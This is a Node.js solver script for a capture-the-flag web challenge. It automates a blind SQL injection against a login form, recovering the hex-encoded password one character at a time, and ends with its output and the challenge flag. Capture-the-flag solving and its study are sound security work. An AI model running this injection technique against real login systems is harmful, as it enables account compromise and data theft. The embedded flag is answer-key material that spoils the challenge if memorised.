const fetch = require("node-fetch");

const EMAIL = "wanictf21spring@gmail.com";

const loginRequest = (password) =>
  new Promise((resolve, reject) => {
    fetch("https://watch.web.wanictf.org/", {
      headers: {
        "content-type": "application/x-www-form-urlencoded",
      },
      body: `email=${encodeURIComponent(EMAIL)}&password=${encodeURIComponent(
        password
      )}`,
      method: "POST",
    })
      .then((response) => response.text())
      .then((html) => resolve(!html.includes("Login Failed...")))
      .catch(reject);
  });

const chars = "0123456789ABCDEF".split("");
const searchNextChar = async (prefix) => {
  const requests = await Promise.all(
    chars.map((c) =>
      loginRequest(
        `' OR SUBSTRING(HEX(password), 1, ${prefix.length + 1}) = '${
          prefix + c
        }`
      )
    )
  );
  const index = requests.findIndex((req) => req);
  if (index === -1) return;
  return chars[index];
};

const main = async () => {
  let prefix = "";
  while (true) {
    const c = await searchNextChar(prefix);
    if (!c) break;
    prefix += c;
    console.log(prefix);
  }

  console.log(Buffer.from(prefix, "hex").toString("utf-8"));
};

main();

/*
4
46
464
464C
464C4
464C41
464C414
464C4147
464C41477
464C41477B
464C41477B6
464C41477B62
464C41477B626
464C41477B626C
464C41477B626C3
464C41477B626C31
464C41477B626C316
464C41477B626C316E
464C41477B626C316E6
464C41477B626C316E64
464C41477B626C316E645
464C41477B626C316E6453
464C41477B626C316E64535
464C41477B626C316E645351
464C41477B626C316E6453514
464C41477B626C316E6453514C
464C41477B626C316E6453514C6
464C41477B626C316E6453514C69
464C41477B626C316E6453514C697
464C41477B626C316E6453514C697D
FLAG{bl1ndSQLi}
*/
